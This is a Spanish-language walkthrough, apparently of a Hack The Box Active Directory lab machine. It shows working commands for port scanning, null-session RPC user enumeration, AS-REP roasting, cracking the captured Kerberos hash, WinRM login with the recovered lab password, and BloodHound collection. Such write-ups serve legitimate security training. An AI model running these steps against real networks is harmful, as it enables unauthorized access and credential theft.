
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.210 -oG allPorts
```

```shell
[*] IP Address: 10.129.95.210
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49681,49685,49700,49866
```

```shell
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49681,49685,49700,49866 -sCV 10.129.95.210 -oN targeted
```

## SMB
Al tener el `SMB` abierto enumeraremos el servicio con [[NETEXEC]]
```shell
nxc smb 10.129.95.210
```

### Listar recursos compartidos

```shell
smbclient -L 10.129.95.210 -N      
```

No vemos ningún tipo de información de recursos compartidos

## DNS
Vamos a ver si es vulnerable al ataque de transferencia de zona

### Ataque de transferencia de zona
Primero verificamos que el DNS nos responde correctamente
```shell
dig @10.129.95.210 htb.local
```

Enumeraremos los servidores de correo
```shell
dig @10.129.95.210 htb.local mx
```

Enumeraremos los name servers
```shell
dig @10.129.95.210 htb.local ns
```

Intentamos aplicar la transferencia de zona
```shell
dig @10.129.95.210 htb.local axfr
```

Y no nos devuelve nada ya que no nos muestra todos los subdominios de la maquina

## RPC
Usaremos el servicio de RPC para haciendo uso de una null session poder enumerar usuarios validos existentes en el dominio
```shell
rpcclient -U "" 10.129.95.210 -N
```

Nos deja acceder con Null Session así que vamos a enumerar los usuarios del dominio
Enumeraremos los usuarios usando el comando 
```shell
enumdomusers
```

Guardar los usuarios en un archivo
```shell
rpcclient -U "" 10.129.95.210 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users
```

Enumeraremos también los grupos existentes
```shell
enumdomgroups
```

Listamos también las descripciones de los usuarios
```shell
querydispinfo
```

Una vez tenemos un listado potencial de usuarios validos un ataque que podemos probar es un [[#AS-REPRoast Atack]]

# Explotación
## AS-REPRoast Atack

Lo primero que tenemos que hacer con nuestra lista de usuarios validos es intentar obtener los tickets TGT de los usuarios
```shell
impacket-GetNPUsers htb.local/ -no-pass -usersfile users
```

EN la salida del comando encontramos un usuario llamado `svc-alfresco` y nos muestra el hash
```shell
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8ee1c1939ffae15b70dbf66f62cd0cfc$7072245f11232b034f664a22c3ebbe5d6ccddd46314b1130679427ffe1ea9d9901df95f74defb860a006bd1cabb2544bc42c99473dc50e275cf47964d5ce2c8daf117a70ccde2767b450b6053db844b4acf262c5eedee6caeec3cd58abd76f8bf3da3813678dbb3749aa4852d30878a8d47aa92b268876477f1cced63fcdb3ceb091d98a00cb83f65284d85a743113ac91b0bbf90e5103cf347a9e15e6202e5ae9b0059215a823e1496e375577edca141c172b2800c3ec63dfb2bce47c6eef4e7c0fedfd3658d42b172c26b4d3ae745b610b263f586fbd300dd47cf5dd2397cf9b2abc2ab015
```

Con el hash obtenido lo tendremos que crackear usando fuerza bruta
```shell
john -w:/usr/share/wordlists/rockyou.txt hash
```

Obteniendo la contraseña del usuario
```ad-hint
svc-alfresco::s3rvice
```

Con [[NETEXEC]] validaremos si la contraseña es valida
```shell
nxc smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

Validando así que la contraseña es valida

Listaremos los recursos compartidos de este usuario
```shell
nxc smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice' --shares
```

Obteniendo como resultado
```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

Probaremos también si son credenciales validas para servicio de `WINRM`
```shell
nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

Accederemos entonces al servicio usando [[EVIL-WINRM]]
```shell
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```


Usaremos en nuestra maquina atacante la herramienta [[LDAPDOMAINDUMP]] para  obtener toda la información del dominio usando unas credenciales validas
```shell
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.95.210
```

Obteniendo toda la información del dominio, si ahora nos montamos un servidor con Python lo podremos ver a través del navegador la información obtenida


# Escalada de Privilegios
Vamos a usar [[BLOODHOUND]] para enumerar las vías potenciales de escalada de privilegios
Obtendremos la información con la herramienta [[BLOODHOUND-PYTHON]]
```shell
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.95.210 -d htb.local -c all --zip
```

Nos generara un zip que subiremos a [[BLOODHOUND]]



